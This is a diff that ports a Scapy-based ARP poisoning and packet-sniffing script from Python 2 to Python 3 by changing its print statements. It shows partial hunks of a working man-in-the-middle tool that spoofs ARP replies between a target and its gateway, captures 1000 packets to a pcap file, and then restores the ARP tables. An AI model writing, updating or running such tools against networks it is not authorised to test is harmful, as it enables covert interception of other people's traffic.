@@ -13,7 +13,7 @@ GATEWAY_IP      =   '192.168.1.1'
 PACKET_COUNT    =   1000
 
 def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
-    print '[*] Restoring targets...'
+    print('[*] Restoring targets...')
     send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst='ff:ff:ff:ff:ff:ff', \
         hwsrc=gateway_mac), count=5)
     send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", \
@@ -39,7 +39,7 @@ def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
     poison_gateway.pdst = gateway_ip
     poison_gateway.hwdst = gateway_mac
 
-    print '[*] Beginning the ARP poison. [CTRL-C to stop]'
+    print('[*] Beginning the ARP poison. [CTRL-C to stop]')
     while 1:
         try:
             send(poison_target)
@@ -49,40 +49,40 @@ def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
         except KeyboardInterrupt:
             restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
 
-        print '[*] ARP poison attack finished.'
+        print('[*] ARP poison attack finished.')
         return
 
 if __name__ == '__main__':
     conf.iface = INTERFACE
     conf.verb = 0
-    print "[*] Setting up %s" % INTERFACE
+    print("[*] Setting up %s" % INTERFACE)
     GATEWAY_MAC = get_mac(GATEWAY_IP)
     if GATEWAY_MAC is None:
-        print "[-] Failed to get gateway MAC. Exiting."
+        print("[-] Failed to get gateway MAC. Exiting.")
         sys.exit(0)
     else:
-        print "[*] Gateway %s is at %s" %(GATEWAY_IP, GATEWAY_MAC)
+        print("[*] Gateway %s is at %s" %(GATEWAY_IP, GATEWAY_MAC))
 
     TARGET_MAC = get_mac(TARGET_IP)
     if TARGET_MAC is None:
-        print "[-] Failed to get target MAC. Exiting."
+        print("[-] Failed to get target MAC. Exiting.")
         sys.exit(0)
     else:
-        print "[*] Target %s is at %s" % (TARGET_IP, TARGET_MAC)
+        print("[*] Target %s is at %s" % (TARGET_IP, TARGET_MAC))
 
     poison_thread = threading.Thread(target = poison_target, args=(GATEWAY_IP, GATEWAY_MAC, \
         TARGET_IP, TARGET_MAC))
     poison_thread.start()
 
     try:
-        print '[*] Starting sniffer for %d packets' %PACKET_COUNT
+        print('[*] Starting sniffer for %d packets' %PACKET_COUNT)
         bpf_filter = 'IP host ' + TARGET_IP
         packets = sniff(count=PACKET_COUNT, iface=INTERFACE)
         wrpcap('results.pcap', packets)
         restore_target(GATEWAY_IP, GATEWAY_MAC, TARGET_IP, TARGET_MAC)
 
     except Scapy_Exception as msg:
-        print msg, "Hi there!!"
+        print(msg, "Hi there!!")
 
     except KeyboardInterrupt:
         restore_target(GATEWAY_IP, GATEWAY_MAC, TARGET_IP, TARGET_MAC)
